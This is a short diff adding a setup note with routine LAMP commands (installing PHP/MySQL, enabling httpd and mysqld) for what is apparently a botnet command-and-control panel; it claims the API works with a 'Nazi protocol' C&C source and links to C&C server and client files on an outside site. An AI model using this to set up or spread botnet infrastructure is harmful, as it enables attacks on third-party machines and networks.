@@ -1,0 +1,15 @@
+# Just do all this if u want but i'm pretty sure 'service httpd start' will work the same lol!
+*************************************************************************************
+yum install php php-mysql
+
+
+sudo chkconfig httpd on
+
+
+chkconfig mysqld on
+
+
+
+**NOTE*** THIS API ONLY BEEN TEST ON THE Voids NAzi Protocal.c - IT WORKS TRY IT
+Links can be found here ; 
+https://www.godz-soldiers.xyz/Archive/C&C-files/Nazi-protocol.c & https://www.godz-soldiers.xyz/Archive/C&C-files/Nazi-Client.c
